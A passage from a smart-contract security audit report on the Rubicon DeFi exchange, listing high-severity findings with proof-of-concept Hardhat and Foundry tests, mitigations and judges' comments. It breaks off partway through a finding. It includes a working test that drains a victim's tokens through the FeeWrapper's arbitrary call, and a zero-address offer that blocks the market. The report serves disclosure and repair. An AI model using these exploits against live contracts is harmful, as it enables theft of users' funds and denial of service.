    let cancelFunc = iface.getFunction("cancel")
    let cancelFuncSig = iface.getSighash(cancelFunc)
    let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [victimOfferId])
    await feeWrapper.rubicall(
      {
        selector: cancelFuncSig,
        args: cancelFuncParams,
        target: rubiconMarket.address,
        feeParams: {
          feeToken: testCoin.address,
          totalAmount: parseUnits("0"),
          feeAmount: parseUnits("0"),
          feeTo: testCoin.address
        }
      }
    )

    // The attacker calls `transfer` to take the victim's tokens from the FeeWrapper, to the attacker account
    let feeWrapperBalance = await testCoin.balanceOf(feeWrapper.address)
    let transferFunc = iface.getFunction("transfer")
    let transferFuncSig = iface.getSighash(transferFunc)
    let transferFuncParams = iface._encodeParams(transferFunc.inputs, [attacker.address, feeWrapperBalance])
    await feeWrapper.rubicall(
      {
        selector: transferFuncSig,
        args: transferFuncParams,
        target: testCoin.address,
        feeParams: {
          feeToken: testCoin.address,
          totalAmount: 0,
          feeAmount: 0,
          feeTo: testCoin.address
        }
      }
    )

    attackerBalance = Number(await testCoin.balanceOf(attacker.address))
    console.log("After attack, attacker has all of the victims tokens. Attacker's balance = ", attackerBalance)
    victimBalance = Number(await testCoin.balanceOf(victim.address))
    console.log("The victim is left with nothing. Victim's balance = ", victimBalance)

    // Assert that we really stole all victim's tokens
    expect(attackerBalance).to.be.gt(0);
    expect(victimBalance).to.equal(0);
  })
});
```

And we created `Some3rdPartyProtocol.sol`, which is almost identical to `Test3rdPartyProtocol.sol`, but uses `RubiconMarket` directly.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../RubiconMarket.sol";
import "../utilities/FeeWrapper.sol";

contract Some3rdPartyProtocol {
    address public feeWrapper;
    uint256 feeType = 10_000; // BPS
    uint256 fee = 10; // 10/10_000
    address feeTo;
    address rubiMarket;

    constructor(address _feeWrapper, address _feeTo, address _rubiMarket) {
        feeWrapper = _feeWrapper;
        feeTo = _feeTo;
        rubiMarket = _rubiMarket;
    }

    function executeOffer(
        uint256 pay_amt,
        address pay_gem,
        uint256 buy_amt,
        address buy_gem,
        uint256 pos
    ) external returns (uint256) {
        uint256[] memory tokenAmounts = new uint256[](2);
        bytes memory id;
        tokenAmounts[0] = pay_amt;
    tokenAmounts[1] = buy_amt;

        IERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);
        IERC20(pay_gem).approve(address(feeWrapper), pay_amt);

        // calculate fee to pay using FeeWrapper
        (uint256[] memory new_amounts, uint256[] memory fees_) = FeeWrapper(
            feeWrapper
        ).calculateFee(tokenAmounts, feeType, fee);

        FeeWrapper.FeeParams memory feeParams = FeeWrapper.FeeParams(
            pay_gem,
            pay_amt,
            fees_[0],
            feeTo
        );

        // update both pay_amt and buy_amt_min with fee deducted
        pay_amt = new_amounts[0];

        // Call rubiMarket.offer
        FeeWrapper.CallParams memory params = FeeWrapper.CallParams(
            bytes4(keccak256(bytes("offer(uint256,address,uint256,address)"))),
            abi.encode(pay_amt, pay_gem, buy_amt, buy_gem),
            rubiMarket,
            feeParams
        );
        id = FeeWrapper(feeWrapper).rubicall(params);

        return uint256(bytes32(id));
    }
}
```

If you run the test, you'll see the following output:

    $ npx hardhat test test/hardhat-tests/exploit-fee-wrapper.ts

    The victim has a lot of tokens. Victim's balance =  `999000000000000000000`
    Before attack attacker has no tokens. Attacker's balance =  `0`
    After attack, attacker has all of the victims tokens. Attacker's balance =  `998001000000000000000`
    The victim is left with nothing. Victim's balance =  `0`

### Exploit 2 - 3rd party calls `RubiconRouter` through the `FeeWrapper`

To emphasize the problem, we'll also show that there's a problem in the example given with `Test3rdPartyProtocol.sol`. There's another bug making it impossible to cancel offers through the `FeeWrapper`, because the `FeeWrapper` is
not capable of accepting `eth`.

The following test is an exploit using the given `Test3rdPartyProtocol.sol` which cancels an offer made by another user. Currently, user cancel doesn't work because `FeeWrapper` doesn't have a payable fallback function. This exploit will work when the payable function is added, resulting in stolen funds.

Just to be clear, currently, an honest user making an offer can't cancel their own offer.

We added the following test to `fee-wrapper.ts` that shows this exploit:

```solidity
it("should call offerWithETH via 3d party AND STEAL IT ALL!", async function () {
  const { testCoin, pepeFinance, feeWrapper, router } = await loadFixture(
    deployRubiProtocolFixture
  );

  const feeToETHBalance0 = await ethers.provider.getBalance(FEE_TO);
  await pepeFinance.executeOfferWithETH(
    parseUnits("9"),
    parseUnits("310"),
    testCoin.address,
    0,
    { value: parseUnits("9") }
  );
  const feeToETHBalance1 = await ethers.provider.getBalance(FEE_TO);
  expect(feeToETHBalance1).to.be.gt(feeToETHBalance0);

  // The attacker calls the `FeeWrapper` directly
  let ABI = [
    "function cancelForETH(uint256 id)"
  ];
  let iface = new ethers.utils.Interface(ABI);
  let cancelFunc = iface.getFunction("cancelForETH")
  let cancelFuncSig = iface.getSighash(cancelFunc)
  let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [5])
  console.log(await feeWrapper.rubicall(
    {
      selector: cancelFuncSig,
      args: cancelFuncParams,
      target: router.address,
      feeParams: {
        feeToken: testCoin.address,
        totalAmount: 0,
        feeAmount: 0,
        feeTo: testCoin.address
      }
    }
  ))
});
```

### Recommended Mitigation Steps

We recommend converting the `FeeWrapper` to be a library, instead of a standalone contract (i.e. it shouldn't have an address) and making the `rubicall` function private. That way, all the logic of the `FeeWrapper` can be used by 3rd parties, but no one can call the `FeeWrapper` directly.

Also, we think `FeeWrapper` functions should have a reentry guard.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/767#issuecomment-1534219562)**


**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/767#issuecomment-1576295124):**
 > There are 2 issues actually:
> 
> 1. Indistinguishable caller context inside the target call. We see a glimpse of this in the [Test3rdPartyProtocol](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/master/contracts/periphery/Test3rdPartyProtocol.sol) where `msg.sender` would indeed be the `FeeWrapper` in the router call.
> 
> 2. Rugging users/3rd party protocols from whatever allowance given to the `FeeWrapper` contract because of the arbitrary target call.
> > For example, we can call ~`offer` and `cancel` (of RubiconMarket) and even~ `transfer/transferFrom` (of any ERC20 token) on its behalf.

***

## [[H-10] Some offers can't be cancelled](https://github.com/code-423n4/2023-04-rubicon-findings/issues/766)
*Submitted by [CryptoCraze](https://github.com/code-423n4/2023-04-rubicon-findings/issues/766), also found by [joestakey](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1143), [kaden](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1137), [jasonxiale](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1001), [Delvir0](https://github.com/code-423n4/2023-04-rubicon-findings/issues/913), [0xDING99YA](https://github.com/code-423n4/2023-04-rubicon-findings/issues/821), [popular00](https://github.com/code-423n4/2023-04-rubicon-findings/issues/800), [popular00](https://github.com/code-423n4/2023-04-rubicon-findings/issues/796), [carrotsmuggler](https://github.com/code-423n4/2023-04-rubicon-findings/issues/746), [Juntao](https://github.com/code-423n4/2023-04-rubicon-findings/issues/732), [mrpathfindr](https://github.com/code-423n4/2023-04-rubicon-findings/issues/725), [mrpathfindr](https://github.com/code-423n4/2023-04-rubicon-findings/issues/667), [said](https://github.com/code-423n4/2023-04-rubicon-findings/issues/595), [CRYP70](https://github.com/code-423n4/2023-04-rubicon-findings/issues/347) and [jangle](https://github.com/code-423n4/2023-04-rubicon-findings/issues/306)*.

A normal user can't cancel their offer when using a specific API.

### Proof of Concept

1.  The function [`offer`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511) of `SimpleMarket` is not overridden by the `RubiconMarket` contract.
*Note: that this function is called in the testing [example](https://github.com/code-423n4/2023-04-rubicon/blob/main/test/foundry-tests/ProtocolDeployment.t.sol#L89)*
2.  The [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L452) function inside `SimpleMarket` is overridden by the [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L871) function in `RubiconMarket`.

When a normal user creates an offer with the `SimpleMarket` API(1), the offer is not inserted into the linked list `_rank`.

After some time the user wants to cancel their order. They can only call `RubiconMarket`'s `cancel` function(2). When they call `cancel` what will happen is:

1.  [`isOfferSorted`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L876) will return `false` because the offer was never inserted into `_rank`.
2.  [`_hide`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L879) will also return `false`, Because the offer was not inserted into the unsorted list `_near`.
3.  Require check will fail because `_hide` returned `false`.

Therefore, the user won't be able to cancel their offer.

### Exploit

Can't cancel when creating an offer with `SimpleMarket`'s `offer`. Add this to `ProtocolDeployment.t.sol`:

```solidity
function test_ExploitCantCancel() public {
  uint id;
  // Create an offer with the function `offer(uint256,ERC20,uint256,ERC20,address,address)` in `SimpleMarket`
  id = market.offer(90e6, TUSDC, 100e18, TEST, address(this), owner);

  // The created offer can't be cancelled! The following line will revert with "Reason: can't hide"
  vm.expectRevert("can't hide");
  market.cancel(id);
}
```

### Recommended Mitigation Steps

Override the `offer` function in `SimpleMarket` with the `offer` function in `RubiconMarket`.
Add this offer function:

```solidity
function offer(
    uint256 pay_amt,
    ERC20 pay_gem,
    uint256 buy_amt,
    ERC20 buy_gem,
    address owner,
    address recipient
) public override can_offer returns (uint256) {
    return
        offer(
            pay_amt,
            pay_gem,
            buy_amt,
            buy_gem,
            0,
            true,
            owner,
            recipient
        );
  }
```

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/766#issuecomment-1534221304)**

***

## [[H-11] `RubiconMarket` checks slippage incorrectly](https://github.com/code-423n4/2023-04-rubicon-findings/issues/666)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/666), also found by [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1320), [R2](https://github.com/code-423n4/2023-04-rubicon-findings/issues/798), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/709), [sces60107](https://github.com/code-423n4/2023-04-rubicon-findings/issues/451) and [ladboy233](https://github.com/code-423n4/2023-04-rubicon-findings/issues/310)*.

`RubiconMarket` checks slippage incorrectly, user can loose funds because of that.

### Proof of Concept

`RubiconMarket.sellAllAmount` function has price protection. User should provide `min_fill_amount` param to that function in order to limit minimum amount they would like to receive.
<br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067>

```solidity
    function sellAllAmount(
        ERC20 pay_gem,
        uint256 pay_amt,
        ERC20 buy_gem,
        uint256 min_fill_amount
    ) external returns (uint256 fill_amt) {
        require(!locked);


        uint256 offerId;
        while (pay_amt > 0) {
            //while there is amount to sell
            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair
            require(offerId != 0, "0 offerId"); //Fails if there are not more offers


            // There is a chance that pay_amt is smaller than 1 wei of the other token
            if (
                mul(pay_amt, 1 ether) <
                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)
            ) {
                break; //We consider that all amount is sold
            }
            if (pay_amt >= offers[offerId].buy_amt) {
                //If amount to sell is higher or equal than current offer amount to buy
                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator
                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell
                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer
            } else {
                // if lower
                uint256 baux = rmul(
                    mul(pay_amt, 10 ** 9),
                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)
                ) / 10 ** 9;
                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator
                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need
                pay_amt = 0; //All amount is sold
            }
        }
        require(fill_amt >= min_fill_amount, "min_fill_amount isn't filled");
        fill_amt = calcAmountAfterFee(fill_amt);
    }
```

When order is filling in this function, the full [offer amount is added](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1051) to `fill_amt` param.
`fill_amt` is the filled amount without fees. Fees [will be decreased](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1066) in the end of function.
But slippage [is checked before](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1065) fees are removed.

This is incorrect, as user will provide `min_fill_amount` that they want to receive after all fees.

The same problem exists for `RubiconMarket.buyAllAmount`.

### Tools Used

VsCode

### Recommended Mitigation Steps

First calculate amount without fees, then check slippage:

```solidity
fill_amt = calcAmountAfterFee(fill_amt);
require(fill_amt >= min_fill_amount, "min_fill_amount isn't filled");
```

**[bghughes (Rubicon) confirmed and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/666#issuecomment-1535429281):**
 > Thanks - we messed up some of the fee logic in this build and are keyed in on a robust solution.
> 
> For this, we will simply remove `fill_amt = calcAmountAfterFee(fill_amt);` and extrapolate fees to view function level, keeping them only present in `buy`,  `getPayAmountWithFee` and `getBuyAmountWithFee`.

***

## [[H-12] DOS of market operations with malicious offers](https://github.com/code-423n4/2023-04-rubicon-findings/issues/644)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-04-rubicon-findings/issues/644), also found by [joestakey](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1382), [Udsen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1380), [brgltd](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1360), [alexzoid](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1352), [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1315), [0xBeirao](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1274), [nirlin](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1273), [halden](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1259), [McToady](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1252), [LaScaloneta](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1211), [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1192), [Evo](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1165), [favelanky](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1126), [0Kage](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1086), [Nyx](https://github.com/code-423n4/2023-04-rubicon-findings/issues/990), [Nyx](https://github.com/code-423n4/2023-04-rubicon-findings/issues/977), [Udsen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/963), [Neon2835](https://github.com/code-423n4/2023-04-rubicon-findings/issues/911), [\_\_141345\_\_](https://github.com/code-423n4/2023-04-rubicon-findings/issues/883), [bin2chen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/867), [whoismatthewmc1](https://github.com/code-423n4/2023-04-rubicon-findings/issues/834), [ast3ros](https://github.com/code-423n4/2023-04-rubicon-findings/issues/830), [whoismatthewmc1](https://github.com/code-423n4/2023-04-rubicon-findings/issues/822), [0xfusion](https://github.com/code-423n4/2023-04-rubicon-findings/issues/797), [CryptoCraze](https://github.com/code-423n4/2023-04-rubicon-findings/issues/771), [CryptoCraze](https://github.com/code-423n4/2023-04-rubicon-findings/issues/768), [Juntao](https://github.com/code-423n4/2023-04-rubicon-findings/issues/740), [SaeedAlipoor01988](https://github.com/code-423n4/2023-04-rubicon-findings/issues/698), [Lilyjjo](https://github.com/code-423n4/2023-04-rubicon-findings/issues/630), [0xPiercer](https://github.com/code-423n4/2023-04-rubicon-findings/issues/560), [MalfurionWhitehat](https://github.com/code-423n4/2023-04-rubicon-findings/issues/367), [CRYP70](https://github.com/code-423n4/2023-04-rubicon-findings/issues/352), [3agle](https://github.com/code-423n4/2023-04-rubicon-findings/issues/327), [SaeedAlipoor01988](https://github.com/code-423n4/2023-04-rubicon-findings/issues/314), [ktg](https://github.com/code-423n4/2023-04-rubicon-findings/issues/273), [ladboy233](https://github.com/code-423n4/2023-04-rubicon-findings/issues/270), [ladboy233](https://github.com/code-423n4/2023-04-rubicon-findings/issues/266), [sces60107](https://github.com/code-423n4/2023-04-rubicon-findings/issues/195), [sces60107](https://github.com/code-423n4/2023-04-rubicon-findings/issues/194), [popular00](https://github.com/code-423n4/2023-04-rubicon-findings/issues/165), [anodaram](https://github.com/code-423n4/2023-04-rubicon-findings/issues/160), [mrpathfindr](https://github.com/code-423n4/2023-04-rubicon-findings/issues/72), and [mrpathfindr](https://github.com/code-423n4/2023-04-rubicon-findings/issues/49)*.

<https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1079> <br><https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1039>

The Rubicon market has two functions that are interesting: `buyAllAmount` and `sellAllAmount`. These functions are responsible for using up offers until the entire amount is bought or sold. The contract stores offers in a sorted linked list, each with its unique id, and sorted according to the price. This ensures that the head of the linked list has the best price, or the best offer for either sell or buy. This head is referenced in the code by the mapping `_best[address][address]` and further worse, offers can be navigated to by calling `best.next`, similar to a linked list navigation.

When `buyAllAmount` is called, a `while loop` is ran, and the best offer is taken out in each iteration using the function `getBestOffer()` similar to the snippet below:

```solidity
while (buy_amt > 0) {
            //Meanwhile there is amount to buy
            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair
            require(offerId != 0, "offerId == 0");
```

The offers are then filled one after the other. However, if an offer is unfillable, or reverts, then the whole transaction reverts. This breaks the functionality of the `buyAllAmount` function and creates a DOS attack vector.

The standard openzeppelin implementation of the ERC20 token does not support transfers to the zero address. If a transaction tries to send tokens to 0 address, it reverts with 'ERC20: transfer to the zero address'. Thus, if an offer is created where the receiver of the payment is zero address, that offer can be unfillable. If this offer is created such that it is the best possible price, then this offer will exist at the head of the linked list in the `_best` variable and thus will be the first offer looked into. Since this offer is unfillable, the entire transaction will revert.

When creating an offer, the user can specify two addresses, the owner address and the recipient address. The contract does not sanitize these addresses and even accepts '0 address' in these fields. These are also the addresses where the payment token is sent when the order is filled.

Thus, a malicious user can create a buy/sell order of a small volume but at a very good price. They can set both the owner and the recipient to '0' when calling `offer()`. This will create a lucrative unfillable order which will always be called on first. This will lead to all transactions reverting due to this single unfillable offer.

The impact is even more pronounced for the `Position.sol` contract. Unlike normal users, this contract does not have the ability to select offers by id, and is only filled using `buyAllAmount` or `sellAllAmount`. A DOS attack, as described above, will break the functionality of the two mentioned functions and break the whole Position contract, as a result. This can lead to large losses where users are unable to unwind positions before liquidations.

This also has a secondary impact of blocking the creation of future orders. As can be seen [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1273-L1341), in the `_matcho` function, when new offers are created they are first matched with existing offers in the same range.  If there is still a balance remaining, a new offer is created. Now if the existing offers are such unfillable orders, it would also block the creation of further new orders, causing another functionality DOS.

### Proof of Concept

The POC shows that if the recipient and owner addresses are both set to '0', the order cannot be filed. This order will exist in the linked list sorted by price and thus will be the first order to be filled.

First, change the code in `deployRubiconProtocolFixture()` where the orders are created [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/ProtocolDeployment.ts#L165-L171) to the following order:

```javascript
await rubiconMarket.functions[
            "offer(uint256,address,uint256,address,address,address)"
        ](
            parseUnits("100"),
            testCoin.address,
            parseUnits("110", 6),
            testStableCoin.address,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
            { from: owner.address }
        )
```

This creates an unfillable order. Now try running the provided test in "can take an offer with 0 makerFee" by using the command: `hardhat test --grep "0 makerFee"`.

This test fails with 'ERC20: transfer to the zero address' error, since the order is unfillable. The test body is also copied here as reference:

```javascript
it("can take an offer with 0 makerFee", async function () {
                const { rubiconMarket, testCoin, owner } = await loadFixture(
                    deployRubiconProtocolFixture
                )
                const balanceBefore = await testCoin.balanceOf(owner.address)
                // in TEST
                const quantity = parseUnits("14")

                // amount that should be received with fee deducted (only Protocol fee!)
                const quantityAfterFee = await rubiconMarket.calcAmountAfterFee(
                    quantity
                )

                // buying TEST with USDCT
                await rubiconMarket.buy(2, quantity)
                // saving new balance state
                const balanceAfter = await testCoin.balanceOf(owner.address)

                // validating that owner received proper amount with ONLY protocol fee charged
                expect(balanceAfter.sub(balanceBefore)).to.be.equal(
                    quantityAfterFee
                )
            })
```

This shows unfillable orders can be created. If this order exists at the top, it will revert calls from the `Position.sol` contract.

### Tools Used

Hardhat

### Recommended Mitigation Steps

This requires multiple mitigation steps:

1.  Do not allow '0 address' as owner. This can be enforced with a `require` statement in the `offer()` function in `SimpleMarket` contract.
2.  Unfillable orders can still be created by setting recipient to blacklisted addresses, for tokens like USDT. To navigate this, in the `while loop` in `buyAllAmount`, include error handling with try-catch blocks to use the next offer, as the current offer is unfillable.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/644#issuecomment-1534560502)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/644#issuecomment-1569880769):**
 > > The impact is even more pronounced for the `Position.sol` contract. Unlike normal users, this contract does not have the ability to select offers by id, and is only filled using `buyAllAmount` or `sellAllAmount`. A DOS attack as described above will break the functionality of the two mentioned functions, and thus break the whole Position contract as a result. This can lead to large losses where users are unable to unwind positions before liquidations.
> 
> > This also has a secondary impact of blocking the creation of future orders. As can be seen [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1273-L1341), in the _matcho function, when new offers are created, they are first matched with existing offers in the same range, and if there is still a balance remaining, a new offer is created. Now if the existing offers are such unfillable orders, it would also block the creation of further new orders, causing another functionality DOS.
> 
> Impact was well described and explained. I consider this to be medium severity though, because it's on L2s where the mainly supported tokens do not revert on null address (unless proven otherwise).
> 
> Satisfactory: has to be similar to best report in impact description (key word I'm looking for is DoSing the Position via `buyAllAmount()`/`sellAllAmount()`).
> 
> 50%: Mentions DoS in some capacity / loss of user funds.
> 
> 25%: Only mention zero address check with no / little impact description.
> 
> After a brief consultation, I've come to the following conclusion over non-standard ERC20 implementations:
> - No return of `bool`/returning false: Excluded because it's been caught by the 4naly3er.
> - FoT/Rebasing: Isolated impact, doesn't affect trades of other tokens.
> - Revert on zero value: Low, isolated impact, doesn't affect trades of other tokens.
> - Revert on null address: Medium, as a substantial number of ERC20 tokens inherit OZ's implementation that has this check, allowing for DoS.

**[HickupHH3 (judge) decreased severity to Medium](https://github.com/code-423n4/2023-04-rubicon-findings/issues/644#issuecomment-1574611746)**

**[carrotsmuggler (warden) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/644#issuecomment-1591874360):**
 > >Impact was well described and explained. I consider this to be medium severity though, because it's on L2s where the mainly supported tokens do not revert on null address (unless proven otherwise).
> 
> According to uniswap [statistics](https://info.uniswap.org/#/arbitrum/), the top 8 tokens by volume are listed below, and their contracts have been evaluated. For all these tokens, transfers to '0 address' results in a revert.
> 
> |Token|Address|
> |-|-|
> |USDT|0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9|
> |USDC|0xaf88d065e77c8cC2239327C5EDb3A432268e5831|
> |weth|0x82aF49447D8a07e3bd95BD0d56f35241523fBab1|
> |wbtc|0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f|
> |arb|0x912CE59144191C1204E64559FE8253a0e49E6548|
> |dai|0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1|
> |bridged usdc|0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8|
> |GMX|0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a|
> 
> Every token (except DAI) follows the open-zeppelin standard and has a require block in their `_transfer` function.
> 
> ```solidity
> require(_sender != address(0), "BaseToken: transfer from the zero address");
> require(_recipient != address(0), "BaseToken: transfer to the zero address");
> ```
> DAI doesn't follow the standard, but has a statement which behaves in a similar manner.
> 
> Since the vast majority (97%+) of the uniswap transactions involve at least one of these tokens, it is safe to assume that **most** transactions would be affected by this bug.
> 
> Since the severity is high (complete breaking of Position contract), and the likelihood is high (97%+ affected volume), the severity of this bug should be upgraded to High.

**[HickupHH3 (judge) increased severity to High and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/644#issuecomment-1592175191):**
 > Justified.

***

## [[H-13] When opening a position, the collateral of the previous position is used for borrowing, which makes the user more easily liquidated](https://github.com/code-423n4/2023-04-rubicon-findings/issues/545)
*Submitted by [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/545)*.

When a user opens a position, if there is collateral in previous positions that have not reached the maximum borrowable amount, this collateral will be used for borrowing, which may cause the user to reach the liquidation threshold, resulting in the user being liquidated.

```solidity
        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));
	// how much is borrowed on a current loop
        uint256 _loopBorrowed;

        while (_assetAmount <= _desiredAmount) {
            if (_limit == 0) {
		// if collateral already provided
                if (_minted != 0) {
                    uint256 _max = _maxBorrow(_bathToken);

		    // take into account previous collateral
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(
                        _max
                    );
```

I will use an example to illustrate it:

Consider the WBTC collateralization rate is 0.7.

Alice is long WBTC using 1e8 WBTC and 1.6x leverage, the contract will collateralize 1e8 WBTC and borrow 0.6e8 WBTC, at which point Alice is 0.7 - 0.6/1 = 10% away from the liquidation threshold.

If Alice continues to use 1e8 WBTC and 1.8x leverage to long WBTC, the previous position will be able to borrow 0.1e8 WBTC, plus the 0.7e8 WBTC that was borrowed by collateralizing 1e8 WBTC, which can be covered without further collateralizing and borrowing, resulting in Alice currently being 0.7 - (0.7 + 0.7)/(1+1) = 0 away from the liquidation threshold. I.e. if the price of WBTC drops slightly, Alice will be liquidated.

If under normal circumstances, Alice is long WBTC using 1e8 WBTC and 1.8x leverage, the contract will collateralize 1e8 WBTC and borrow 0.7e8 WBTC, then collateralize 0.7e8 WBTC and borrow 0.1 WBTC, at which point Alice is 0.7 - 0.8/1.7 = 23% from the liquidation threshold.

The following POC indicates that when a user opens a position with 1.6x and 1.8x leverage in succession, the user will reach the liquidation threshold:

```js
    describe("Long positions 📈", function () {
      it("LPOC1", async function () {
        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(
          deployPoolsUtilityFixture
        );
        const TEST_AMOUNT_1 = parseUnits("1");
        const x1_6 = parseUnits("1.6");

        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT_1,
          x1_6
        );
        console.log("owner liquidity %s",await comptroller.getAccountLiquidity(Position.address));
        const x1_8 = parseUnits("1.8");

        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT_1,
          x1_8
        );
        console.log("owner liquidity %s",await comptroller.getAccountLiquidity(Position.address));
      });
      it("LPOC2", async function () {
        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(
          deployPoolsUtilityFixture
        );
        const TEST_AMOUNT_1 = parseUnits("1");
        const x1_8 = parseUnits("1.8");

        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT_1,
          x1_8
        );
        console.log("owner liquidity %s",await comptroller.getAccountLiquidity(Position.address));
      });
```

```sh
  Leverage positions Test
    Pools Utility Test
      Long positions 📈
owner liquidity [
  BigNumber { value: "0" },
  BigNumber { value: "90000000000000000" },
  BigNumber { value: "0" }
]
owner liquidity [
  BigNumber { value: "0" },
  BigNumber { value: "0" },
  BigNumber { value: "0" }
]
        ✓ LPOC1
owner liquidity [
  BigNumber { value: "0" },
  BigNumber { value: "347451975478099020" },
  BigNumber { value: "0" }
]
```

### Proof of Concept

<https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550>

### Tools Used

Hardhat

### Recommended Mitigation Steps

Consider not using collateral from previous positions for borrowing when opening a position.

**[daoio (Rubicon) disagreed with severity and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/545#issuecomment-1534801924):**
 > Yeah, the issue is correct. It will increase a possibility of being liquidated, though it was an intended behavior.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/545#issuecomment-1569793812):**
 > A bit of similarity with [#1180](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1180), but conditions to achieve it are different.
> 
> Keeping it as High because probability of liquidation at this point is very high, as good as degen trading.

***

## [[H-14] Users might get less assets than expected upon migration due to price manipulation attacks](https://github.com/code-423n4/2023-04-rubicon-findings/issues/497)
*Submitted by [0xNineDec](https://github.com/code-423n4/2023-04-rubicon-findings/issues/497)*.

It is possible to manipulate the price of `BathV2` tokens before a migration and consequently the migrator will receive underpriced V2 tokens, incurring losses.

The migration process of `V2Migrator.migrate()` hands in the user's `BathV1` balance in exchange of its underlying. Then, proceeds to mint the counterpart of `BathV2` tokens providing the same amount of recovered underlying tokens:

```solidity
function migrate(IBathToken bathTokenV1) external {
    //////////////// V1 WITHDRAWAL ////////////////
    uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);
    require(bathBalance > 0, "migrate: ZERO AMOUNT");

    /// @dev approve first
    bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);

    // withdraw all tokens from the pool
    uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);

    //////////////// V2 DEPOSIT ////////////////
    IERC20 underlying = bathTokenV1.underlyingToken();
    address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];

